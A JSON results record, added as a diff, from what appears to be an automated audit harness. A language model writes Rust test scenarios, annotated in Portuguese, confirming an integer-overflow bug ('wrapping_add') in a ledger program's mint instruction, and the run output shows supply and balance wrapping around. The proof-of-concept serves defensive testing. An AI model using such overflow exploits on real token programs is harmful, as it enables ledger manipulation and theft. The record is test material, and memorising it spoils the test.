@@ -1,0 +1,140 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply reiniciou para valor menor que o inicial; balance reiniciou para valor menor que o inicial",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2367,
+        "completion_tokens": 554,
+        "latency_s": 3.25
+      },
+      "raw": "{\"plan\": \"Preparar uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) nos offsets 40 e 48. Baseline: chamar mint com amount pequeno (ex.: 1) e verificar que supply/balance incrementam normalmente. Ataque: chamar mint com amount grande o suficiente para estourar (ex.: 10), fazendo wrapping_add reiniciar os valores. Efeito: apos o ataque, ler supply/balance e confirmar que sao menores que os valores iniciais (underflow visual), demonstrando a quebra da invariante.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut data = vec![0u8; 56];\\nlet initial_supply = u64::MAX - 5;\\nlet initial_balance = u64::MAX - 5;\\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &data, None);\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet ix_baseline = env.raw_ix(&[IX_MINT, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\\nlet r_base = env.baseline(\\\"mint legitimo com amount=1\\\", &ix_baseline, &contas);\\n\\nlet ix_attack = env.raw_ix(&[IX_MINT, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\\nlet r = env.attack(\\\"mint com amount=10 estoura u64::MAX\\\", &ix_attack, &contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let new_supply = read_u64(d, 40);\\n    let new_balance = read_u64(d, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o inicial\\\", new_supply < initial_supply);\\n    env.effect(\\\"balance reiniciou para valor menor que o inicial\\\", new_balance < initial_balance);\\n}\"}",
+      "plan": "Preparar uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) nos offsets 40 e 48. Baseline: chamar mint com amount pequeno (ex.: 1) e verificar que supply/balance incrementam normalmente. Ataque: chamar mint com amount grande o suficiente para estourar (ex.: 10), fazendo wrapping_add reiniciar os valores. Efeito: apos o ataque, ler supply/balance e confirmar que sao menores que os valores iniciais (underflow visual), demonstrando a quebra da invariante.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut data = vec![0u8; 56];\nlet initial_supply = u64::MAX - 5;\nlet initial_balance = u64::MAX - 5;\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &data, None);\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet ix_baseline = env.raw_ix(&[IX_MINT, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\nlet r_base = env.baseline(\"mint legitimo com amount=1\", &ix_baseline, &contas);\n\nlet ix_attack = env.raw_ix(&[IX_MINT, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\nlet r = env.attack(\"mint com amount=10 estoura u64::MAX\", &ix_attack, &contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let new_supply = read_u64(d, 40);\n    let new_balance = read_u64(d, 48);\n    env.effect(\"supply reiniciou para valor menor que o inicial\", new_supply < initial_supply);\n    env.effect(\"balance reiniciou para valor menor que o inicial\", new_balance < initial_balance);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:18:36\n   |\n18 |     let ix_baseline = env.raw_ix(&[IX_MINT, 1u64.to_le_bytes().as_ref(...\n   |                                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:21:34\n   |\n21 |     let ix_attack = env.raw_ix(&[IX_MINT, 10u64.to_le_bytes().as_ref()...\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:18:36\n   |\n18 |     let ix_baseline = env.raw_ix(&[IX_MINT, 1u64.to_le_bytes().as_ref(...\n   |                                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:21:34\n   |\n21 |     let ix_attack = env.raw_ix(&[IX_MINT, 10u64.to_le_bytes().as_ref()...\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2985,
+        "completion_tokens": 527,
+        "latency_s": 2.7
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX - 5). O baseline chama mint com amount=1, que deve ter sucesso e nao estourar. O ataque chama mint com amount=10, que faz wrapping_add estourar e reiniciar supply/balance para valores pequenos. O efeito mede que supply e balance ficaram menores que os valores iniciais, demonstrando o overflow silencioso.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut data = vec![0u8; 56];\\nlet initial_supply = u64::MAX - 5;\\nlet initial_balance = u64::MAX - 5;\\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &data, None);\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet ix_baseline = env.raw_ix(&[0u8, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\\nlet r_base = env.baseline(\\\"mint legitimo com amount=1\\\", &ix_baseline, &contas);\\n\\nlet ix_attack = env.raw_ix(&[0u8, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\\nlet r = env.attack(\\\"mint com amount=10 estoura u64::MAX\\\", &ix_attack, &contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let new_supply = read_u64(d, 40);\\n    let new_balance = read_u64(d, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o inicial\\\", new_supply < initial_supply);\\n    env.effect(\\\"balance reiniciou para valor menor que o inicial\\\", new_balance < initial_balance);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX - 5). O baseline chama mint com amount=1, que deve ter sucesso e nao estourar. O ataque chama mint com amount=10, que faz wrapping_add estourar e reiniciar supply/balance para valores pequenos. O efeito mede que supply e balance ficaram menores que os valores iniciais, demonstrando o overflow silencioso.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut data = vec![0u8; 56];\nlet initial_supply = u64::MAX - 5;\nlet initial_balance = u64::MAX - 5;\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &data, None);\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet ix_baseline = env.raw_ix(&[0u8, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\nlet r_base = env.baseline(\"mint legitimo com amount=1\", &ix_baseline, &contas);\n\nlet ix_attack = env.raw_ix(&[0u8, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(ledger_key, false)]);\nlet r = env.attack(\"mint com amount=10 estoura u64::MAX\", &ix_attack, &contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let new_supply = read_u64(d, 40);\n    let new_balance = read_u64(d, 48);\n    env.effect(\"supply reiniciou para valor menor que o inicial\", new_supply < initial_supply);\n    env.effect(\"balance reiniciou para valor menor que o inicial\", new_balance < initial_balance);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:18:41\n   |\n18 | ...0u8, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(l...\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:21:39\n   |\n21 | ...0u8, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(...\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nFor more information about this error, try `rustc --explain E0308`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:18:41\n   |\n18 | ...0u8, 1u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(l...\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:21:39\n   |\n21 | ...0u8, 10u64.to_le_bytes().as_ref()].concat(), vec![AccountMeta::new(...\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `u8`, found `&[u8]`\n\nFor more information about this error, try `rustc --explain E0308`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2983,
+        "completion_tokens": 552,
+        "latency_s": 3.3
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX - 5). O baseline faz um mint legitimo de 1, provando que o cenario esta correto. O ataque faz mint de 10, o que estoura u64::MAX e reinicia os valores via wrapping_add. O efeito mede que supply e balance ficaram menores que os valores iniciais, demonstrando o wrap-around.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut data = vec![0u8; 56];\\nlet initial_supply = u64::MAX - 5;\\nlet initial_balance = u64::MAX - 5;\\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\\nlet ledger = account(&env.program_id, &data, None);\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet mut ix_data_base = vec![0u8];\\nix_data_base.extend_from_slice(&1u64.to_le_bytes());\\nlet ix_baseline = env.raw_ix(&ix_data_base, vec![AccountMeta::new(ledger_key, false)]);\\nlet r_base = env.baseline(\\\"mint legitimo com amount=1\\\", &ix_baseline, &contas);\\n\\nlet mut ix_data_attack = vec![0u8];\\nix_data_attack.extend_from_slice(&10u64.to_le_bytes());\\nlet ix_attack = env.raw_ix(&ix_data_attack, vec![AccountMeta::new(ledger_key, false)]);\\nlet r = env.attack(\\\"mint com amount=10 estoura u64::MAX\\\", &ix_attack, &contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let new_supply = read_u64(d, 40);\\n    let new_balance = read_u64(d, 48);\\n    env.effect(\\\"supply reiniciou para valor menor que o inicial\\\", new_supply < initial_supply);\\n    env.effect(\\\"balance reiniciou para valor menor que o inicial\\\", new_balance < initial_balance);\\n}\"}",
+      "plan": "Preparo uma conta ledger com supply e balance proximos de u64::MAX (u64::MAX - 5). O baseline faz um mint legitimo de 1, provando que o cenario esta correto. O ataque faz mint de 10, o que estoura u64::MAX e reinicia os valores via wrapping_add. O efeito mede que supply e balance ficaram menores que os valores iniciais, demonstrando o wrap-around.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut data = vec![0u8; 56];\nlet initial_supply = u64::MAX - 5;\nlet initial_balance = u64::MAX - 5;\ndata[40..48].copy_from_slice(&initial_supply.to_le_bytes());\ndata[48..56].copy_from_slice(&initial_balance.to_le_bytes());\nlet ledger = account(&env.program_id, &data, None);\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet mut ix_data_base = vec![0u8];\nix_data_base.extend_from_slice(&1u64.to_le_bytes());\nlet ix_baseline = env.raw_ix(&ix_data_base, vec![AccountMeta::new(ledger_key, false)]);\nlet r_base = env.baseline(\"mint legitimo com amount=1\", &ix_baseline, &contas);\n\nlet mut ix_data_attack = vec![0u8];\nix_data_attack.extend_from_slice(&10u64.to_le_bytes());\nlet ix_attack = env.raw_ix(&ix_data_attack, vec![AccountMeta::new(ledger_key, false)]);\nlet r = env.attack(\"mint com amount=10 estoura u64::MAX\", &ix_attack, &contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let new_supply = read_u64(d, 40);\n    let new_balance = read_u64(d, 48);\n    env.effect(\"supply reiniciou para valor menor que o inicial\", new_supply < initial_supply);\n    env.effect(\"balance reiniciou para valor menor que o inicial\", new_balance < initial_balance);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com amount=1",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "0001000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "74a8be692d39ae2e",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000fbfffffffffffffffbffffffffffffff"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint com amount=10 estoura u64::MAX",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "000a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "74a8be692d39ae2e",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000400000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply reiniciou para valor menor que o inicial",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance reiniciou para valor menor que o inicial",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply reiniciou para valor menor que o inicial; balance reiniciou para valor menor que o inicial"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "let new_supply = supply.wrapping_add(amount);\nlet new_balance = balance.wrapping_add(amount);",
+    "explanation": "As operacoes de adicao usam `wrapping_add`, que silenciosamente descarta o overflow. Se `supply + amount` ou `balance + amount` excederem `u64::MAX`, o valor reinicia para perto de zero, permitindo manipular o supply/balance.",
+    "attack_hypothesis": "O atacante chama `mint` com um `amount` grande o suficiente para que `supply.wrapping_add(amount)` ou `balance.wrapping_add(amount)` estoure, fazendo o saldo/supply reiniciar para um valor pequeno ou zero e quebrando a invariante do ledger."
+  }
+}
